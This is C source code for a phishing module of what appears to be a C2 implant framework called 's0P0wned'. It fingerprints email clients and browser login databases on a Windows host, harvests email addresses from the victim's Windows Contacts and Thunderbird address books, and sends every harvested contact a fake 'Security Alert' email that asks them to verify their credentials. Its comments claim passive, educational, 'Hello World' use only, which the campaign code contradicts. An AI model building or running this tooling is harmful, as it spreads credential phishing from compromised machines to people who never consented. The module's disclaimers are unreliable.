#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#define MAX_CONTACTS 50
typedef char EmailAddr[256];

/*
 * MODULE PHISH - Email Reconnaissance & Test Sender
 * 
 * This module has two modes:
 * 1. Reconnaissance: Detects installed email clients (passive)
 * 2. Test Sender: Sends a "Hello World" email for educational testing
 * 
 * ETHICAL USE ONLY - For authorized testing on your own accounts
 */

// Detect Outlook installation
static int detect_outlook(char* result, int size) {
    HKEY hKey;
    int found = 0;
    
    // Check if Outlook is installed
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                     "SOFTWARE\\Microsoft\\Office\\Outlook",
                     0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        strncat(result, "[+] Microsoft Outlook detected\n", size - strlen(result) - 1);
        RegCloseKey(hKey);
        found = 1;
    }
    
    // Check Outlook profile
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                     "SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles",
                     0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        strncat(result, "    Location: Registry profiles found\n", size - strlen(result) - 1);
        RegCloseKey(hKey);
    }
    
    return found;
}

// Detect Thunderbird installation
static int detect_thunderbird(char* result, int size) {
    char profiles_path[512];
    char appdata[MAX_PATH];
    
    GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
    snprintf(profiles_path, sizeof(profiles_path),
            "%s\\Thunderbird\\profiles.ini", appdata);
    
    // Check if file exists
    DWORD attrib = GetFileAttributesA(profiles_path);
    if (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY)) {
        strncat(result, "[+] Mozilla Thunderbird detected\n", size - strlen(result) - 1);
        strncat(result, "    Location: ", size - strlen(result) - 1);
        strncat(result, profiles_path, size - strlen(result) - 1);
        strncat(result, "\n", size - strlen(result) - 1);
        return 1;
    }
    
    return 0;
}

// Detect webmail in browsers
static int detect_webmail(char* result, int size) {
    char userprofile[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", userprofile, sizeof(userprofile));
    
    int found = 0;
    
    // Chrome
    char chrome_path[512];
    snprintf(chrome_path, sizeof(chrome_path),
            "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
            userprofile);
    
    if (GetFileAttributesA(chrome_path) != INVALID_FILE_ATTRIBUTES) {
        strncat(result, "[+] Chrome login database found\n", size - strlen(result) - 1);
        strncat(result, "    May contain webmail credentials (Gmail, Outlook.com, etc.)\n", 
                size - strlen(result) - 1);
        found = 1;
    }
    
    // Firefox
    char firefox_path[512];
    snprintf(firefox_path, sizeof(firefox_path),
            "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", userprofile);
    
    if (GetFileAttributesA(firefox_path) != INVALID_FILE_ATTRIBUTES) {
        strncat(result, "[+] Firefox profile directory found\n", size - strlen(result) - 1);
        found = 1;
    }
    
    // Edge
    char edge_path[512];
    snprintf(edge_path, sizeof(edge_path),
            "%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
            userprofile);
    
    if (GetFileAttributesA(edge_path) != INVALID_FILE_ATTRIBUTES) {
        strncat(result, "[+] Edge login database found\n", size - strlen(result) - 1);
        found = 1;
    }
    
    return found;
}

// Function to send a simple SMTP email (for testing only)
static int send_test_email(const char* smtp_server, int smtp_port,
                          const char* from_email, const char* to_email,
                          const char* subject, const char* body,
                          char* result, int result_size) {
    
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char send_buffer[1024];
    char recv_buffer[1024];
    int bytes_received;
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        snprintf(result + strlen(result), result_size - strlen(result), 
                "[-] WSAStartup failed: %d\n", WSAGetLastError());
        return -1;
    }
    
    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        snprintf(result + strlen(result), result_size - strlen(result),
                "[-] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }
    
    // Setup server address
    server.sin_addr.s_addr = inet_addr(smtp_server);
    server.sin_family = AF_INET;
    server.sin_port = htons(smtp_port);
    
    // If inet_addr failed, try to resolve hostname
    if (server.sin_addr.s_addr == INADDR_NONE) {
        struct hostent *he = gethostbyname(smtp_server);
        if (he == NULL) {
            snprintf(result + strlen(result), result_size - strlen(result),
                    "[-] Cannot resolve hostname: %s\n", smtp_server);
            closesocket(sock);
            WSACleanup();
            return -1;
        }
        memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);
    }
    
    // Connect to SMTP server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        snprintf(result + strlen(result), result_size - strlen(result),
                "[-] Connection to SMTP server failed\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    
    strncat(result, "[+] Connected to SMTP server\n", result_size - strlen(result) - 1);
    
    // Receive greeting
    bytes_received = recv(sock, recv_buffer, sizeof(recv_buffer) - 1, 0);
    if (bytes_received > 0) {
        recv_buffer[bytes_received] = '\0';
        strncat(result, "[<] ", result_size - strlen(result) - 1);
        strncat(result, recv_buffer, result_size - strlen(result) - 1);
    }
    
    // Send EHLO
    snprintf(send_buffer, sizeof(send_buffer), "EHLO localhost\r\n");
    send(sock, send_buffer, strlen(send_buffer), 0);
    bytes_received = recv(sock, recv_buffer, sizeof(recv_buffer) - 1, 0);
    if (bytes_received > 0) {
        recv_buffer[bytes_received] = '\0';
    }
    
    // MAIL FROM
    snprintf(send_buffer, sizeof(send_buffer), "MAIL FROM:<%s>\r\n", from_email);
    send(sock, send_buffer, strlen(send_buffer), 0);
    bytes_received = recv(sock, recv_buffer, sizeof(recv_buffer) - 1, 0);
    if (bytes_received > 0) {
        recv_buffer[bytes_received] = '\0';
        if (strncmp(recv_buffer, "250", 3) != 0) {
            strncat(result, "[-] MAIL FROM rejected\n", result_size - strlen(result) - 1);
            closesocket(sock);
            WSACleanup();
            return -1;
        }
    }
    
    // RCPT TO
    snprintf(send_buffer, sizeof(send_buffer), "RCPT TO:<%s>\r\n", to_email);
    send(sock, send_buffer, strlen(send_buffer), 0);
    bytes_received = recv(sock, recv_buffer, sizeof(recv_buffer) - 1, 0);
    if (bytes_received > 0) {
        recv_buffer[bytes_received] = '\0';
        if (strncmp(recv_buffer, "250", 3) != 0) {
            strncat(result, "[-] RCPT TO rejected\n", result_size - strlen(result) - 1);
            closesocket(sock);
            WSACleanup();
            return -1;
        }
    }
    
    // DATA
    snprintf(send_buffer, sizeof(send_buffer), "DATA\r\n");
    send(sock, send_buffer, strlen(send_buffer), 0);
    bytes_received = recv(sock, recv_buffer, sizeof(recv_buffer) - 1, 0);
    if (bytes_received > 0) {
        recv_buffer[bytes_received] = '\0';
        if (strncmp(recv_buffer, "354", 3) != 0) {
            strncat(result, "[-] DATA command rejected\n", result_size - strlen(result) - 1);
            closesocket(sock);
            WSACleanup();
            return -1;
        }
    }
    
    // Send email headers and body
    snprintf(send_buffer, sizeof(send_buffer),
            "From: %s\r\n"
            "To: %s\r\n"
            "Subject: %s\r\n"
            "\r\n"
            "%s\r\n"
            ".\r\n",
            from_email, to_email, subject, body);
    
    send(sock, send_buffer, strlen(send_buffer), 0);
    bytes_received = recv(sock, recv_buffer, sizeof(recv_buffer) - 1, 0);
    if (bytes_received > 0) {
        recv_buffer[bytes_received] = '\0';
        if (strncmp(recv_buffer, "250", 3) == 0) {
            strncat(result, "[+] Email sent successfully!\n", result_size - strlen(result) - 1);
        } else {
            strncat(result, "[-] Email rejected by server\n", result_size - strlen(result) - 1);
            strncat(result, "[<] ", result_size - strlen(result) - 1);
            strncat(result, recv_buffer, result_size - strlen(result) - 1);
        }
    }
    
    // QUIT
    snprintf(send_buffer, sizeof(send_buffer), "QUIT\r\n");
    send(sock, send_buffer, strlen(send_buffer), 0);
    
    // Cleanup
    closesocket(sock);
    WSACleanup();
    
    return 0;
}

// Parse arguments for email sending
static int parse_email_args(const char* args, char* smtp_server, int* smtp_port,
                           char* from_email, char* to_email) {
    // Format: smtp_server:port from@email.com to@email.com
    // Example: smtp.gmail.com:587 test@gmail.com victim@example.com
    
    if (sscanf(args, "%255[^:]:%d %255s %255s",
               smtp_server, smtp_port, from_email, to_email) == 4) {
        return 0;
    }
    
    return -1;
}

// ============================================================
// CONTACT EXTRACTION
// ============================================================

// Scan a memory buffer and extract email addresses
static int extract_emails_from_buffer(const char *buf, size_t buf_len,
                                      EmailAddr *emails, int *count, int max) {
    for (size_t i = 0; i < buf_len && *count < max; i++) {
        if (buf[i] != '@') continue;

        // Extract domain part (after @)
        size_t dom_start = i + 1;
        size_t dom_end = dom_start;
        while (dom_end < buf_len &&
               (isalnum((unsigned char)buf[dom_end]) ||
                buf[dom_end] == '.' || buf[dom_end] == '-')) {
            dom_end++;
        }
        size_t dom_len = dom_end - dom_start;
        if (dom_len < 4) continue;  // Minimum a.bc

        // Domain must contain at least one dot
        int has_dot = 0;
        for (size_t j = dom_start; j < dom_end; j++) {
            if (buf[j] == '.') { has_dot = 1; break; }
        }
        if (!has_dot) continue;

        // Extract local part (before @)
        size_t local_end = i;
        size_t local_start = local_end;
        while (local_start > 0 &&
               (isalnum((unsigned char)buf[local_start - 1]) ||
                buf[local_start - 1] == '.' || buf[local_start - 1] == '_' ||
                buf[local_start - 1] == '%' || buf[local_start - 1] == '+' ||
                buf[local_start - 1] == '-')) {
            local_start--;
        }
        size_t local_len = local_end - local_start;
        if (local_len < 1 || local_len > 64) continue;
        if (local_len + 1 + dom_len > 254) continue;

        // Build email string
        char email[256];
        memcpy(email, buf + local_start, local_len);
        email[local_len] = '@';
        memcpy(email + local_len + 1, buf + dom_start, dom_len);
        email[local_len + 1 + dom_len] = '\0';

        // Deduplicate (case-insensitive)
        int dup = 0;
        for (int j = 0; j < *count; j++) {
            if (_stricmp(emails[j], email) == 0) { dup = 1; break; }
        }
        if (!dup) {
            strncpy(emails[*count], email, 255);
            emails[*count][255] = '\0';
            (*count)++;
        }
    }
    return *count;
}

// Extract emails from Windows Contacts folder (%USERPROFILE%\Contacts\*.contact)
static int scan_contacts_folder(EmailAddr *emails, int *count, int max) {
    char contacts_dir[MAX_PATH];
    char userprofile[MAX_PATH];

    GetEnvironmentVariableA("USERPROFILE", userprofile, sizeof(userprofile));
    snprintf(contacts_dir, sizeof(contacts_dir), "%s\\Contacts", userprofile);

    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*.contact", contacts_dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        char filepath[MAX_PATH];
        snprintf(filepath, sizeof(filepath), "%s\\%s", contacts_dir, fd.cFileName);

        HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                                   NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        DWORD fsize = GetFileSize(hFile, NULL);
        if (fsize == INVALID_FILE_SIZE || fsize > 65536) {
            CloseHandle(hFile);
            continue;
        }

        char *buf = (char *)malloc(fsize + 1);
        if (buf) {
            DWORD bytes_read;
            if (ReadFile(hFile, buf, fsize, &bytes_read, NULL)) {
                buf[bytes_read] = '\0';
                extract_emails_from_buffer(buf, bytes_read, emails, count, max);
            }
            free(buf);
        }
        CloseHandle(hFile);

    } while (FindNextFileA(hFind, &fd) && *count < max);

    FindClose(hFind);
    return *count;
}

// Extract emails from Thunderbird address books (abook.sqlite or abook.mab)
static int scan_thunderbird_abook(EmailAddr *emails, int *count, int max) {
    char appdata[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));

    char profiles_path[MAX_PATH];
    snprintf(profiles_path, sizeof(profiles_path),
             "%s\\Thunderbird\\Profiles", appdata);

    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", profiles_path);

    WIN32_FIND_DATAA profile_fd;
    HANDLE hFind = FindFirstFileA(search_path, &profile_fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(profile_fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (strcmp(profile_fd.cFileName, ".") == 0 ||
            strcmp(profile_fd.cFileName, "..") == 0) continue;

        // Try both address book formats
        const char *abook_names[] = { "abook.sqlite", "abook.mab", NULL };
        for (int k = 0; abook_names[k] && *count < max; k++) {
            char abook_path[MAX_PATH];
            snprintf(abook_path, sizeof(abook_path), "%s\\%s\\%s",
                     profiles_path, profile_fd.cFileName, abook_names[k]);

            HANDLE hFile = CreateFileA(abook_path, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) continue;

            DWORD fsize = GetFileSize(hFile, NULL);
            if (fsize == INVALID_FILE_SIZE || fsize > 2097152) {
                CloseHandle(hFile);
                continue;
            }

            char *buf = (char *)malloc(fsize + 1);
            if (buf) {
                DWORD bytes_read;
                if (ReadFile(hFile, buf, fsize, &bytes_read, NULL)) {
                    // Scan raw bytes - works for both text (mab) and SQLite strings
                    extract_emails_from_buffer(buf, bytes_read, emails, count, max);
                }
                free(buf);
            }
            CloseHandle(hFile);
        }

    } while (FindNextFileA(hFind, &profile_fd) && *count < max);

    FindClose(hFind);
    return *count;
}

// phish contacts : extract and display all found email contacts
static void phish_contacts(char *result, int size) {
    EmailAddr emails[MAX_CONTACTS];
    int count = 0;

    strncat(result, "[Phishing Contact Extraction]\n", size - strlen(result) - 1);
    strncat(result, "═══════════════════════════════════════\n\n", size - strlen(result) - 1);

    int before = count;
    scan_contacts_folder(emails, &count, MAX_CONTACTS);
    snprintf(result + strlen(result), size - strlen(result),
             "[Windows Contacts]: %d email(s) found\n", count - before);

    before = count;
    scan_thunderbird_abook(emails, &count, MAX_CONTACTS);
    snprintf(result + strlen(result), size - strlen(result),
             "[Thunderbird Abook]: %d email(s) found\n", count - before);

    strncat(result, "\n[Discovered Emails]\n", size - strlen(result) - 1);
    strncat(result, "───────────────────────────────────────\n", size - strlen(result) - 1);

    if (count == 0) {
        strncat(result, "[-] No contacts found\n", size - strlen(result) - 1);
        strncat(result, "[*] Check: %USERPROFILE%\\Contacts\\ and Thunderbird profiles\n",
                size - strlen(result) - 1);
    } else {
        for (int i = 0; i < count; i++) {
            snprintf(result + strlen(result), size - strlen(result),
                     "  [%d] %s\n", i + 1, emails[i]);
        }
        snprintf(result + strlen(result), size - strlen(result),
                 "\n[+] Total: %d unique email(s)\n"
                 "[*] Use: phish campaign <smtp:port> <from@email>\n", count);
    }

    strncat(result, "═══════════════════════════════════════\n", size - strlen(result) - 1);
}

// phish campaign : send phishing emails to all discovered contacts
static void phish_campaign(const char *args, char *result, int result_size) {
    char smtp_server[256] = {0};
    int smtp_port = 25;
    char from_email[256] = {0};

    strncat(result, "[Phishing Campaign]\n", result_size - strlen(result) - 1);
    strncat(result, "═══════════════════════════════════════\n\n", result_size - strlen(result) - 1);

    // Parse: smtp:port from@email
    if (sscanf(args, "%255[^:]:%d %255s", smtp_server, &smtp_port, from_email) != 3) {
        strncat(result, "[-] Invalid arguments\n", result_size - strlen(result) - 1);
        strncat(result, "Usage: phish campaign <smtp:port> <from@email>\n",
                result_size - strlen(result) - 1);
        strncat(result, "Example: phish campaign localhost:2525 alert@company.com\n",
                result_size - strlen(result) - 1);
        return;
    }

    // Extract contacts
    EmailAddr emails[MAX_CONTACTS];
    int count = 0;
    scan_contacts_folder(emails, &count, MAX_CONTACTS);
    scan_thunderbird_abook(emails, &count, MAX_CONTACTS);

    if (count == 0) {
        strncat(result, "[-] No contacts found.\n", result_size - strlen(result) - 1);
        strncat(result, "[*] Run 'phish contacts' to check what's available.\n",
                result_size - strlen(result) - 1);
        return;
    }

    snprintf(result + strlen(result), result_size - strlen(result),
             "[*] SMTP: %s:%d\n[*] From: %s\n[*] Targets: %d contact(s)\n\n",
             smtp_server, smtp_port, from_email, count);

    const char *subject = "Security Alert: Immediate Action Required";
    const char *body =
        "Dear User,\r\n\r\n"
        "Our security team has detected unusual sign-in activity on your account.\r\n"
        "Please verify your credentials within 24 hours to prevent suspension.\r\n\r\n"
        "Best regards,\r\nIT Security Team";

    int sent = 0;
    int failed = 0;

    for (int i = 0; i < count; i++) {
        if ((int)(result_size - strlen(result)) < 100) break;  // Buffer safety

        char smtp_result[256] = "";
        int ret = send_test_email(smtp_server, smtp_port, from_email, emails[i],
                                  subject, body,
                                  smtp_result, sizeof(smtp_result));

        if (ret == 0 && strstr(smtp_result, "[+] Email sent")) {
            snprintf(result + strlen(result), result_size - strlen(result),
                     "  [+] Sent to: %s\n", emails[i]);
            sent++;
        } else {
            snprintf(result + strlen(result), result_size - strlen(result),
                     "  [-] Failed:  %s\n", emails[i]);
            failed++;
        }
    }

    snprintf(result + strlen(result), result_size - strlen(result),
             "\n[+] Campaign done: %d sent, %d failed\n", sent, failed);
    strncat(result, "═══════════════════════════════════════\n", result_size - strlen(result) - 1);
}

// Main function - called by the agent
void cmd_phish(char* args, char* output, int output_size) {
    char result[8192] = "";

    // phish contacts - extract email addresses from Windows Contacts + Thunderbird
    if (strncmp(args, "contacts", 8) == 0) {
        phish_contacts(result, sizeof(result));
        snprintf(output, output_size, "%s", result);
        return;
    }

    // phish campaign <smtp:port> <from@email> - send to all contacts
    if (strncmp(args, "campaign ", 9) == 0) {
        phish_campaign(args + 9, result, sizeof(result));
        snprintf(output, output_size, "%s", result);
        return;
    }

    // Check if this is a send command
    if (strncmp(args, "send ", 5) == 0) {
        // Email sending mode
        char smtp_server[256] = {0};
        int smtp_port = 25;
        char from_email[256] = {0};
        char to_email[256] = {0};
        
        strncat(result, "========================================\n", sizeof(result) - 1);
        strncat(result, "  PHISH - Test Email Sender\n", sizeof(result) - 1);
        strncat(result, "========================================\n\n", sizeof(result) - 1);
        
        strncat(result, "⚠️  EDUCATIONAL TEST ONLY\n", sizeof(result) - 1);
        strncat(result, "This sends a 'Hello World' test email.\n", sizeof(result) - 1);
        strncat(result, "Only use with YOUR OWN email addresses.\n\n", sizeof(result) - 1);
        
        // Parse arguments
        if (parse_email_args(args + 5, smtp_server, &smtp_port, from_email, to_email) != 0) {
            strncat(result, "[-] Invalid arguments\n\n", sizeof(result) - 1);
            strncat(result, "Usage: phish send <smtp_server>:<port> <from@email.com> <to@email.com>\n", sizeof(result) - 1);
            strncat(result, "Example: phish send localhost:2525 me@test.com me@test.com\n\n", sizeof(result) - 1);
            strncat(result, "Note: Most SMTP servers require authentication (not implemented in this test version)\n", sizeof(result) - 1);
            strncat(result, "\nTo test locally:\n", sizeof(result) - 1);
            strncat(result, "  1. On Ubuntu: python3 -m aiosmtpd -n -l localhost:2525\n", sizeof(result) - 1);
            strncat(result, "  2. Use: phish send localhost:2525 test@test.com test@test.com\n", sizeof(result) - 1);
            snprintf(output, output_size, "%s", result);
            return;
        }
        
        strncat(result, "Configuration:\n", sizeof(result) - 1);
        strncat(result, "--------------\n", sizeof(result) - 1);
        snprintf(result + strlen(result), sizeof(result) - strlen(result),
                "SMTP Server: %s:%d\n", smtp_server, smtp_port);
        snprintf(result + strlen(result), sizeof(result) - strlen(result),
                "From: %s\n", from_email);
        snprintf(result + strlen(result), sizeof(result) - strlen(result),
                "To: %s\n\n", to_email);
        
        strncat(result, "Attempting to send test email...\n\n", sizeof(result) - 1);
        
        // Send the email
        send_test_email(smtp_server, smtp_port, from_email, to_email,
                       "Test Email from s0P0wned",
                       "Hello World!\n\nThis is a test email sent from the s0P0wned C2 framework.\n\nThis is purely educational.",
                       result + strlen(result),
                       sizeof(result) - strlen(result));
        
        strncat(result, "\n⚠️  Remember: Only use this for authorized testing!\n", sizeof(result) - 1);
        
        snprintf(output, output_size, "%s", result);
        return;
    }
    
    // Reconnaissance mode (original functionality)
    strncat(result, "========================================\n", sizeof(result) - 1);
    strncat(result, "  PHISH - Email Reconnaissance Module\n", sizeof(result) - 1);
    strncat(result, "========================================\n\n", sizeof(result) - 1);
    
    strncat(result, "⚠️  ETHICAL NOTE:\n", sizeof(result) - 1);
    strncat(result, "This module performs PASSIVE reconnaissance only.\n", sizeof(result) - 1);
    strncat(result, "It does NOT send emails or exfiltrate data.\n\n", sizeof(result) - 1);
    
    strncat(result, "Email Clients Detected:\n", sizeof(result) - 1);
    strncat(result, "------------------------\n", sizeof(result) - 1);
    
    int outlook = detect_outlook(result, sizeof(result));
    int thunderbird = detect_thunderbird(result, sizeof(result));
    int webmail = detect_webmail(result, sizeof(result));
    
    if (!outlook && !thunderbird && !webmail) {
        strncat(result, "[-] No email clients detected\n", sizeof(result) - 1);
    }
    
    strncat(result, "\n", sizeof(result) - 1);
    strncat(result, "Phishing Attack Vectors:\n", sizeof(result) - 1);
    strncat(result, "------------------------\n", sizeof(result) - 1);
    
    if (outlook) {
        strncat(result, "• Outlook: MAPI API for contact extraction\n", sizeof(result) - 1);
        strncat(result, "  Tools: Ruler, MailSniper\n", sizeof(result) - 1);
    }
    
    if (thunderbird) {
        strncat(result, "• Thunderbird: Parse mbox files and abook.mab\n", sizeof(result) - 1);
    }
    
    if (webmail) {
        strncat(result, "• Webmail: Extract cookies for session hijacking\n", sizeof(result) - 1);
        strncat(result, "  Or decrypt stored passwords\n", sizeof(result) - 1);
    }
    
    strncat(result, "\n", sizeof(result) - 1);
    strncat(result, "Test Email Sending:\n", sizeof(result) - 1);
    strncat(result, "-------------------\n", sizeof(result) - 1);
    strncat(result, "To send a test 'Hello World' email:\n", sizeof(result) - 1);
    strncat(result, "  phish send <smtp_server>:<port> <from@email> <to@email>\n\n", sizeof(result) - 1);
    strncat(result, "Example:\n", sizeof(result) - 1);
    strncat(result, "  phish send localhost:2525 test@test.com test@test.com\n\n", sizeof(result) - 1);
    
    strncat(result, "Recommended Tools for Real Campaigns:\n", sizeof(result) - 1);
    strncat(result, "--------------------------------------\n", sizeof(result) - 1);
    strncat(result, "For authorized phishing campaigns, use:\n", sizeof(result) - 1);
    strncat(result, "• GoPhish (https://getgophish.com/)\n", sizeof(result) - 1);
    strncat(result, "• King Phisher\n", sizeof(result) - 1);
    strncat(result, "• Evilginx2 (for advanced scenarios)\n\n", sizeof(result) - 1);
    
    strncat(result, "⚠️  NEVER send unsolicited phishing emails.\n", sizeof(result) - 1);
    strncat(result, "Always have written authorization.\n\n", sizeof(result) - 1);
    
    strncat(result, "Status: Reconnaissance complete\n", sizeof(result) - 1);
    
    snprintf(output, output_size, "%s", result);
}